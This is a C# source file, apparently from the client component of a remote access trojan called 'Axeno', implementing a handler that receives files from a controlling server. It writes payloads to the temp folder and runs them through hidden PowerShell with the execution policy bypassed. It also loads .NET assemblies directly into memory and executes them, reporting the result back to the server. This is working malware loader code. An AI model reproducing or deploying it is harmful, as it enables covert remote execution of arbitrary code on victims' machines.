using Axeno.Client.Helper;
using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Axeno.Client.Networking.Functions.Networking
{
    internal class ReceiveFile
    {
        public static void HandlePacket(MsgPack msgpack)
        {
            try
            {
                string type = msgpack.ForcePathObject("RunType").AsString;
                switch (type)
                {
                    case "Disk":
                        {
                            string fullPath = Path.Combine(Path.GetTempPath(), Methods.GetRandomString(6) + msgpack.ForcePathObject("Extension").AsString);
                            File.WriteAllBytes(fullPath, Zip.Decompress(msgpack.ForcePathObject("File").GetAsBytes()));
                            if (msgpack.ForcePathObject("Extension").AsString.ToLower().EndsWith(".ps1"))
                            {
                                Process.Start(new ProcessStartInfo
                                {
                                    FileName = "cmd",
                                    Arguments = $"/c start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath {"'" + "\"" + fullPath + "\"" + "'"} & exit",
                                    CreateNoWindow = true,
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    UseShellExecute = true,
                                    ErrorDialog = false,
                                });
                            }
                            else
                            {
                                Process.Start(new ProcessStartInfo
                                {
                                    FileName = "cmd",
                                    Arguments = $"/c start /b powershell –ExecutionPolicy Bypass Start-Process -FilePath {"'" + "\"" + fullPath + "\"" + "'"} & exit",
                                    CreateNoWindow = true,
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    UseShellExecute = true,
                                    ErrorDialog = false,
                                });
                            }
                            MsgPack mpack = new MsgPack();
                            mpack.ForcePathObject("Packet").AsString = "FileSender";
                            mpack.ForcePathObject("Result").AsString = "Success";
                            ClientSocket.Send(mpack.Encode2Bytes());
                            break;
                        }
                    case "Memory":
                        {
                            byte[] buffer = msgpack.ForcePathObject("File").GetAsBytes();

                                new Thread(delegate ()
                                {
                                    try
                                    {
                                        Assembly loader = Assembly.Load(Zip.Decompress(buffer));
                                        object[] parm = null;
                                        if (loader.EntryPoint.GetParameters().Length > 0)
                                        {
                                            parm = new object[] { new string[] { null } };
                                        }
                                        loader.EntryPoint.Invoke(null, parm);
                                    }
                                    catch (Exception)
                                    {
                                        MsgPack mpack = new MsgPack();
                                        mpack.ForcePathObject("Packet").AsString = "FileSender";
                                        mpack.ForcePathObject("Result").AsString = "Failure";
                                        ClientSocket.Send(mpack.Encode2Bytes());
                                        return;
                                    }
                                })
                                { IsBackground = false }.Start();

                            break;
                        }
                }
            }
            catch (Exception)
            {
                MsgPack mpack = new MsgPack();
                mpack.ForcePathObject("Packet").AsString = "FileSender";
                mpack.ForcePathObject("Result").AsString = "Failure";
                ClientSocket.Send(mpack.Encode2Bytes());
            }
        }
    }
}
